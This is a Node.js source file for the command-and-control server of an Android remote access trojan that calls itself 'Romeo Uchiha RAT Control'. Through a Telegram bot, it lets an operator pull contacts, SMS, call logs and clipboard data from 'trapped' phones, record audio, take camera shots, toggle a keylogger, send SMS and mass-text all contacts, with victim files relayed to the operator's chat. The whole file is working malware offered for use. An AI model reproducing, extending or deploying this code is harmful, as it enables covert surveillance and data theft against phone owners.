const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Reading config file (Do not change this logic as requested)
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));

const bot = new telegramBot(data.token, {
  polling: true,
  request: {}
});

const appData = new Map();

// --- ROMEO UCHIHA STYLING ---
const HEADER = "<b>🩸 𝙍𝙤𝙢𝙚𝙤 𝙐𝙘𝙝𝙞𝙝𝙖 (𝙎𝙝𝙖𝙧𝙞𝙣𝙜𝙖𝙣) 👁️</b>\n\n";

// Action Keyboard Setup
const actions = [
  "📱 Contacts", "💬 SMS", "📞 Calls", "📲 Apps", "📸 Main camera", 
  "🤳 Selfie Camera", "🎤 Microphone", "📋 Clipboard", "🖼️ Screenshot", 
  "🔔 Toast", "✉️ Send SMS", "📳 Vibrate", "🎵 Play audio", "🛑 Stop Audio", 
  "🔴 Keylogger ON", "⚫ Keylogger OFF", "📁 File explorer", "🖼️ Gallery", 
  "🔒 Encrypt", "🔓 Decrypt", "📢 Send SMS to all contacts", "💬 Pop notification", 
  "🌐 Open URL", "🎣 Phishing", "🔙 Back to main menu"
];

// Reusable Keyboard Maker
const getActionKeyboard = () => {
  return {
    keyboard: [
      ["📱 Contacts", "💬 SMS"], ["📞 Calls", "📲 Apps"], 
      ["📸 Main camera", "🤳 Selfie Camera"], ["🎤 Microphone", "📋 Clipboard"], 
      ["🖼️ Screenshot", "🔔 Toast"], ["✉️ Send SMS", "📳 Vibrate"], 
      ["🎵 Play audio", "🛑 Stop Audio"], ["🔴 Keylogger ON", "⚫ Keylogger OFF"], 
      ["📁 File explorer", "🖼️ Gallery"], ["🔒 Encrypt", "🔓 Decrypt"], 
      ["🌐 Open URL", "🎣 Phishing"], ["📢 Send SMS to all contacts"], 
      ["💬 Pop notification"], ["🔙 Back to main menu"]
    ],
    resize_keyboard: true,
    one_time_keyboard: true
  };
};

const getMainMenu = () => {
  return {
    keyboard: [["🎯 Devices", "⚔️ Action"], ["ℹ️ About us"]],
    resize_keyboard: true
  };
};

// --- ANIMATED LOADER FUNCTION ---
async function sendAnimatedLoader(chatId, keyboardMarkup) {
    try {
        let sentMsg = await bot.sendMessage(chatId, HEADER + "🌀 <i>Initializing Genjutsu...</i>\n<b>[▓▓░░░░░░░░] 20%</b>", { parse_mode: "HTML" });
        
        setTimeout(() => {
            bot.editMessageText(HEADER + "🌀 <i>Transmitting Command...</i>\n<b>[▓▓▓▓▓▓▓░░░] 70%</b>", {
                chat_id: chatId, message_id: sentMsg.message_id, parse_mode: "HTML"
            }).catch(()=>{});
        }, 600);

        setTimeout(() => {
            bot.editMessageText(HEADER + "✔️ <b>Request Executed Successfully!</b>\n<b>[▓▓▓▓▓▓▓▓▓▓] 100%</b>\n\n⏳ <i>Waiting for device response...</i>\n\n🔙 <b>Returned to main menu</b>", {
                chat_id: chatId, message_id: sentMsg.message_id, parse_mode: "HTML", reply_markup: keyboardMarkup
            }).catch(()=>{});
        }, 1400);
    } catch (e) { console.error(e); }
}

// --- EXPRESS ENDPOINTS ---
app.post("/upload", uploader.single('file'), (req, res) => {
  const fileName = req.file.originalname;
  const deviceModel = req.headers.model || "Unknown";
  
  bot.sendDocument(data.id, req.file.buffer, {
    caption: HEADER + `📁 <b>File received from → ${deviceModel}</b>`,
    parse_mode: "HTML"
  }, {
    filename: fileName,
    contentType: "*/*"
  }).catch(e => console.log(e));
  
  res.send("Done");
});

app.get("/text", (req, res) => {
  res.send(data.text);
});

// --- SOCKET CONNECTION ---
io.on("connection", socket => {
  let deviceModel = socket.handshake.headers.model + '-' + io.sockets.sockets.size || "Unknown";
  let deviceVersion = socket.handshake.headers.version || "Unknown";
  let deviceIp = socket.handshake.headers.ip || "Unknown";
  
  socket.model = deviceModel;
  socket.version = deviceVersion;
  
  let connectMsg = HEADER + "🟢 <b>New device Trapped</b>\n\n" + 
                   "<b>Model</b> → " + deviceModel + "\n" + 
                   "<b>Version</b> → " + deviceVersion + "\n" + 
                   "<b>IP</b> → " + deviceIp + "\n" + 
                   "<b>Time</b> → " + socket.handshake.time + "\n\n";
                   
  bot.sendMessage(data.id, connectMsg, { parse_mode: "HTML" });
  
  socket.on("disconnect", () => {
    let disconnectMsg = HEADER + "🔴 <b>Device Disconnected</b>\n\n" + 
                        "<b>Model</b> → " + deviceModel + "\n" + 
                        "<b>Version</b> → " + deviceVersion + "\n" + 
                        "<b>IP</b> → " + deviceIp + "\n" + 
                        "<b>Time</b> → " + socket.handshake.time + "\n\n";
    bot.sendMessage(data.id, disconnectMsg, { parse_mode: "HTML" });
  });
  
  socket.on("message", msgText => {
    bot.sendMessage(data.id, HEADER + `💬 <b>Message from → ${deviceModel}\n\nData →</b>\n<code>${msgText}</code>`, { parse_mode: "HTML" });
  });
});

// --- TELEGRAM BOT LOGIC ---
bot.on("message", msg => {
  const text = msg.text;
  
  if (text === "/start") {
    bot.sendMessage(data.id, HEADER + "Welcome to the <b>Romeo Uchiha RAT Control</b> 👁️\n\nA pro-level malware to control Android devices seamlessly.\nDeveloped & Managed by: <b>Romeo Uchiha</b>", {
      parse_mode: "HTML",
      reply_markup: getMainMenu()
    });
    return;
  }
  
  // --- AWAITING INPUT LOGIC ---
  const currentAction = appData.get("currentAction");
  const target = appData.get('currentTarget');

  if (currentAction === "microphoneDuration") {
    let duration = text;
    if (target === "all") io.sockets.emit("commend", { request: "microphone", extras: [{ key: "duration", value: duration }] });
    else io.to(target).emit("commend", { request: "microphone", extras: [{ key: "duration", value: duration }] });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    sendAnimatedLoader(data.id, getMainMenu());
    return;
  } 
  
  if (currentAction === "toastText") {
    let toastTxt = text;
    if (target === "all") io.sockets.emit("commend", { request: "toast", extras: [{ key: "text", value: toastTxt }] });
    else io.to(target).emit("commend", { request: "toast", extras: [{ key: "text", value: toastTxt }] });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    sendAnimatedLoader(data.id, getMainMenu());
    return;
  } 
  
  if (currentAction === "smsNumber") {
    appData.set("currentNumber", text);
    appData.set("currentAction", 'smsText');
    bot.sendMessage(data.id, HEADER + "💬 <b>Now Enter a message that you want to send to " + text + "</b>", {
      parse_mode: "HTML", reply_markup: { keyboard: [["❌ Cancel action"]], resize_keyboard: true, one_time_keyboard: true }
    });
    return;
  } 
  
  if (currentAction === "smsText") {
    let smsTxt = text;
    let number = appData.get("currentNumber");
    
    if (target === "all") io.sockets.emit("commend", { request: "sendSms", extras: [{ key: "number", value: number }, { key: "text", value: smsTxt }] });
    else io.to(target).emit("commend", { request: "sendSms", extras: [{ key: "number", value: number }, { key: "text", value: smsTxt }] });
    
    appData.delete('currentTarget');
    appData.delete("currentAction");
    appData.delete("currentNumber");
    sendAnimatedLoader(data.id, getMainMenu());
    return;
  } 
  
  if (currentAction === "vibrateDuration") {
    let duration = text;
    if (target === "all") io.sockets.emit("commend", { request: "vibrate", extras: [{ key: "duration", value: duration }] });
    else io.to(target).emit("commend", { request: "vibrate", extras: [{ key: "duration", value: duration }] });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    sendAnimatedLoader(data.id, getMainMenu());
    return;
  } 
  
  if (currentAction === "textToAllContacts") {
    let msgTxt = text;
    if (target === "all") io.sockets.emit("commend", { request: "smsToAllContacts", extras: [{ key: "text", value: msgTxt }] });
    else io.to(target).emit("commend", { request: "smsToAllContacts", extras: [{ key: "text", value: msgTxt }] });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    sendAnimatedLoader(data.id, getMainMenu());
    return;
  } 
  
  if (currentAction === "notificationText") {
    appData.set("currentNotificationText", text);
    if (target === "all") {
        io.sockets.emit("commend", { request: "popNotification", extras: [{ key: "text", value: text }] });
    } else {
        // Fix for undefined URL from original code
        io.to(target).emit("commend", { request: 'popNotification', extras: [{ key: "text", value: text }, { key: "url", value: "https://google.com" }] });
    }
    appData.delete('currentTarget');
    appData.delete("currentAction");
    appData.delete("currentNotificationText");
    sendAnimatedLoader(data.id, getMainMenu());
    return;
  }

  // --- MENU COMMANDS ---
  if (text === "🎯 Devices") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, HEADER + "⚠️ <b>There are no connected devices yet.</b>", { parse_mode: "HTML" });
    } else {
      let msg = HEADER + "🦅 <b>Connected devices count: " + io.sockets.sockets.size + "</b>\n\n";
      let count = 1;
      io.sockets.sockets.forEach((socket) => {
        msg += "<b>Device " + count + "</b>\n" + 
               "<b>Model</b> → " + socket.model + "\n" + 
               "<b>Version</b> → " + socket.version + "\n" + 
               "<b>IP</b> → " + socket.handshake.headers.ip + "\n" + 
               "<b>Time</b> → " + socket.handshake.time + "\n\n";
        count++;
      });
      bot.sendMessage(data.id, msg, { parse_mode: "HTML" });
    }
  } 
  else if (text === "⚔️ Action") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, HEADER + "⚠️ <b>No devices available to perform actions.</b>", { parse_mode: "HTML" });
    } else {
      let deviceList = [];
      io.sockets.sockets.forEach((socket) => { deviceList.push([socket.model]); });
      deviceList.push(["🌍 All Devices"]);
      deviceList.push(["🔙 Back to main menu"]);
      bot.sendMessage(data.id, HEADER + "🎯 <b>Select device to perform action</b>", {
        parse_mode: 'HTML', reply_markup: { keyboard: deviceList, resize_keyboard: true, one_time_keyboard: true }
      });
    }
  } 
  else if (text === "ℹ️ About us") {
    bot.sendMessage(data.id, HEADER + "<b>Developed & Controlled exclusively by:\n\n🩸 𝗥𝗼𝗺𝗲𝗼 𝗨𝗰𝗵𝗶𝗵𝗮\n👁️ Genjutsu Master</b>", { parse_mode: 'HTML' });
  } 
  else if (text === "🔙 Back to main menu") {
    bot.sendMessage(data.id, HEADER + "🏠 <b>Main Menu</b>", { parse_mode: "HTML", reply_markup: getMainMenu() });
  } 
  else if (text === "❌ Cancel action") {
    let targetDevice = "Unknown";
    if (appData.get("currentTarget") !== "all" && io.sockets.sockets.has(appData.get("currentTarget"))) {
        targetDevice = io.sockets.sockets.get(appData.get("currentTarget")).model;
    }
    
    if (appData.get("currentTarget") === "all") {
      bot.sendMessage(data.id, HEADER + "🎯 <b>Action Cancelled. Select action for ALL devices</b>", { parse_mode: "HTML", reply_markup: getActionKeyboard() });
    } else {
      bot.sendMessage(data.id, HEADER + "🎯 <b>Action Cancelled. Select action for " + targetDevice + "</b>", { parse_mode: "HTML", reply_markup: getActionKeyboard() });
    }
    appData.delete("currentAction");
  } 
  else if (actions.includes(text)) {
    let currentTarget = appData.get("currentTarget");
    
    // Commands without inputs
    const simpleCommands = {
      "📱 Contacts": "contacts", "💬 SMS": "all-sms", "📞 Calls": "calls", 
      "📲 Apps": "apps", "📸 Main camera": "main-camera", "🤳 Selfie Camera": "selfie-camera",
      "📋 Clipboard": "clipboard", "🔴 Keylogger ON": "keylogger-on", "⚫ Keylogger OFF": "keylogger-off"
    };

    if (simpleCommands[text]) {
      if (currentTarget === "all") io.sockets.emit("commend", { request: simpleCommands[text], extras: [] });
      else io.to(currentTarget).emit("commend", { request: simpleCommands[text], extras: [] });
      
      appData.delete("currentTarget");
      sendAnimatedLoader(data.id, getMainMenu());
    } 
    // Premium Commands (Not implemented in backend)
    else if (["🖼️ Screenshot", "📁 File explorer", "🖼️ Gallery", "🔒 Encrypt", "🔓 Decrypt", "🌐 Open URL", "🎣 Phishing", "🎵 Play audio"].includes(text)) {
      bot.sendMessage(data.id, HEADER + "💎 <b>This feature is only available in the Premium Uchiha Version.</b>", { parse_mode: "HTML", reply_markup: getMainMenu() });
    }
    // Commands requiring inputs
    else if (text === "🎤 Microphone") {
      appData.set("currentAction", 'microphoneDuration');
      bot.sendMessage(data.id, HEADER + "🎤 <b>Enter the microphone recording duration in seconds</b>", { parse_mode: 'HTML', reply_markup: { keyboard: [["❌ Cancel action"]], resize_keyboard: true, one_time_keyboard: true } });
    } 
    else if (text === "🔔 Toast") {
      appData.set("currentAction", "toastText");
      bot.sendMessage(data.id, HEADER + "💬 <b>Enter the message that you want to appear in toast box</b>", { parse_mode: "HTML", reply_markup: { keyboard: [["❌ Cancel action"]], resize_keyboard: true, one_time_keyboard: true } });
    } 
    else if (text === "✉️ Send SMS") {
      appData.set("currentAction", "smsNumber");
      bot.sendMessage(data.id, HEADER + "📱 <b>Enter the phone number to send SMS</b>", { parse_mode: 'HTML', reply_markup: { keyboard: [["❌ Cancel action"]], resize_keyboard: true, one_time_keyboard: true } });
    } 
    else if (text === "📳 Vibrate") {
      appData.set("currentAction", "vibrateDuration");
      bot.sendMessage(data.id, HEADER + "📳 <b>Enter the duration you want the device to vibrate in seconds</b>", { parse_mode: "HTML", reply_markup: { keyboard: [["❌ Cancel action"]], resize_keyboard: true, one_time_keyboard: true } });
    } 
    else if (text === "📢 Send SMS to all contacts") {
      appData.set("currentAction", "textToAllContacts");
      bot.sendMessage(data.id, HEADER + "📢 <b>Enter the text that you want to send to all contacts</b>", { parse_mode: "HTML", reply_markup: { keyboard: [["❌ Cancel action"]], resize_keyboard: true, one_time_keyboard: true } });
    } 
    else if (text === "💬 Pop notification") {
      appData.set("currentAction", "notificationText");
      bot.sendMessage(data.id, HEADER + "🔔 <b>Enter text that you want to appear as notification</b>", { parse_mode: "HTML", reply_markup: { keyboard: [["❌ Cancel action"]], resize_keyboard: true, one_time_keyboard: true } });
    }
  } 
  // Select Target logic
  else {
    io.sockets.sockets.forEach((socket, id) => {
      if (text === socket.model) {
        appData.set("currentTarget", id);
        bot.sendMessage(data.id, HEADER + "🎯 <b>Select action to perform on " + socket.model + "</b>", {
          parse_mode: "HTML", reply_markup: getActionKeyboard()
        });
      }
    });
    if (text === "🌍 All Devices") {
      appData.set("currentTarget", "all");
      bot.sendMessage(data.id, HEADER + "🎯 <b>Select action to perform on ALL available devices</b>", {
        parse_mode: "HTML", reply_markup: getActionKeyboard()
      });
    }
  }
});

// --- KEEP ALIVE LOGIC ---
setInterval(() => {
  io.sockets.sockets.forEach((socket, id) => {
    io.to(id).emit("ping", {});
  });
}, 5000);

setInterval(() => {
  https.get(data.host, res => {}).on("error", err => {});
}, 480000);

// --- START SERVER ---
server.listen(process.env.PORT || 3000, () => {
  console.log("Romeo Uchiha Server running on port 3000 👁️");
});
